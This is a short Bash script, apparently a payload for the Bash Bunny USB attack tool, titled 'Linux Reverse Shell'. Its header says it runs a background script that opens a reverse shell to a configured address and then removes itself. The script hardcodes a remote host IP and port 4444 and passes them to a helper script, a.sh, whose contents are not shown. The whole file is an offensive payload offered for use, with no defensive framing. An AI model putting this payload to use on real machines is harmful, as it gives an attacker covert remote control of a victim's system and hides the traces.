#!/bin/bash
#
# Title:         Linux Reverse Shell
# Author:        tuzzmaniandevil
# Version:       1.2
#
# Runs a script in the background that creates a reverse shell connection to the configured address and then removes itself.
#
# Magenta..................Setup
# Yellow single blink......Executing
# Green....................Finished

BASH_BUNNY_DIR=$HOME/bash_bunny
PAYLOAD_DIR=$BASH_BUNNY_DIR/payloads/LinuxReverseShell
mkdir -p $BASH_BUNNY_DIR $PAYLOAD_DIR

# Config options
RHOST=172.31.24.230
RPORT=4444

# Copy bash script
bash $PAYLOAD_DIR/a.sh $RHOST $RPORT

